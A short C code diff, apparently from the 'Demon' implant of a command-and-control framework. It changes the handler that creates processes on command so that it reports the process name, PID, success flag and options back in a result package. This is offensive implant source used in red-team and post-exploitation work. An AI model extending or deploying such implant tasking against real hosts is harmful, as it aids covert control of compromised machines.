@@ -437,7 +437,6 @@ VOID CommandProc( PPARSER Parser )
 
         case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )
         {
-            // TODO: finish this
             PROCESS_INFORMATION ProcessInfo     = { 0 };
             UINT32              ProcessSize     = 0;
             UINT32              ProcessArgsSize = 0;
@@ -446,6 +445,7 @@ VOID CommandProc( PPARSER Parser )
             PCHAR               ProcessArgs     = ParserGetBytes( Parser, &ProcessArgsSize );
             BOOL                ProcessPiped    = ParserGetInt32( Parser );
             BOOL                ProcessVerbose  = ParserGetInt32( Parser );
+            BOOL                Success         = FALSE;
 
             if ( ProcessSize == 0 )
                 Process = NULL;
@@ -464,16 +464,16 @@ VOID CommandProc( PPARSER Parser )
             PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );
 
             // TODO: make it optional to choose process arch
-            if ( ! ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL ) )
-            {
-                PackageDestroy( Package );
-                return;
-            }
-            else
-            {
-                if ( ProcessVerbose )
-                    PackageAddInt32( Package, ProcessInfo.dwProcessId );
+            Success = ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL );
 
+            PackageAddBytes( Package, Process, ProcessSize );
+            PackageAddInt32( Package, Success ? ProcessInfo.dwProcessId : 0 );
+            PackageAddInt32( Package, Success );
+            PackageAddInt32( Package, ProcessPiped );
+            PackageAddInt32( Package, ProcessVerbose );
+
+            if ( Success )
+            {
                 Instance.Win32.NtClose( ProcessInfo.hThread );
                 if ( ! ProcessPiped )
                     Instance.Win32.NtClose( ProcessInfo.hProcess );
